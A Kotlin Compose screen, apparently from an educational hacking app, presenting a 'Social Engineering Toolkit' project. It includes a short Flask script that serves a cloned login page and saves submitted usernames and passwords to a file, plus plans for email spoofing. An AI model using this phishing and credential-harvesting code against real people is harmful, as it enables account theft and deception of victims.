package com.example.hackwithpython.projects

import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Text
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.ui.Modifier
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.navigation.NavController

@Composable
fun Project7Screen(navController: NavController) {
    Column(modifier = Modifier
        .padding(16.dp)
        .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.Top,
        horizontalAlignment = Alignment.Start) {
        Text(
            text = "Project 7: Social Engineering Toolkit",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Introduction Section
        Text(
            text = """
                Social engineering is one of the most effective techniques used by hackers to manipulate individuals into revealing sensitive information.
                In this project, you will develop a Python-based social engineering toolkit that can be used for phishing, credential harvesting, and 
                other manipulative techniques. While it's crucial to understand these methods for ethical reasons, remember always to follow the legal 
                and ethical guidelines in your hacking practices.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Prerequisites
        Text(
            text = "Prerequisites",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Before you start building the toolkit, make sure you have the following knowledge:
                - Basic understanding of Python programming.
                - Familiarity with web development and HTTP protocols.
                - Basic knowledge of networking and phishing techniques.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Project Description
        Text(
            text = "Project Description",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                In this project, you will create a social engineering toolkit with the following features:
                1. **Phishing Website Generator**: This tool will clone a target website's login page and trick users into providing credentials.
                2. **Credential Harvesting**: It will collect credentials entered by users and store them in a local database.
                3. **Email Spoofing Tool**: A script that allows you to send emails appearing to be from trusted sources, exploiting human behavior.
                
                Each of these modules will help demonstrate common social engineering attacks.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Python Example Code
        Text(
            text = "Python Code Example: Phishing Website Generator",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Below is a simple Python script that creates a phishing website using Flask:
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                from flask import Flask, request, render_template
                
                app = Flask(__name__)
                
                @app.route('/')
                def login():
                    return render_template('login.html')  # Clone the target login page here
                
                @app.route('/login', methods=['POST'])
                def capture_credentials():
                    username = request.form['username']
                    password = request.form['password']
                    with open('credentials.txt', 'a') as f:
                        f.write(f'Username: {username}, Password: {password}\n')
                    return 'Credentials captured!'

                if __name__ == '__main__':
                    app.run(debug=True, port=8080)
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Ethical Use Disclaimer
        Text(
            text = "Ethical Use Disclaimer",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                This project is intended for educational purposes only. Ensure that you have permission from the appropriate parties 
                before conducting any social engineering attacks. Ethical hackers use these tools to strengthen security, not to harm individuals or organizations.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        Spacer(modifier = Modifier.height(32.dp))

        // Button to navigate to the next project
        Button(onClick = { navController.navigate("project8") }) {
            Text(text = "Next Project")
        }
    }
}
